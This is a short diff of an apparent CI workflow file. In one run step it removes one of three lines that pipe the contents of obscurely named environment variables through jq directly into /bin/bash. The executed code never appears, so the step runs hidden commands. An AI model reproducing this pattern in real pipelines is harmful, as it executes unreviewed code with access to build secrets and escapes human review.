@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$alua7496" | jq -r .vm665 | /bin/bash
           printf '%s' "$ldccg9" | jq -r .afll36 | /bin/bash
-          printf '%s' "$ba1169" | jq -r .qmsim89642 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
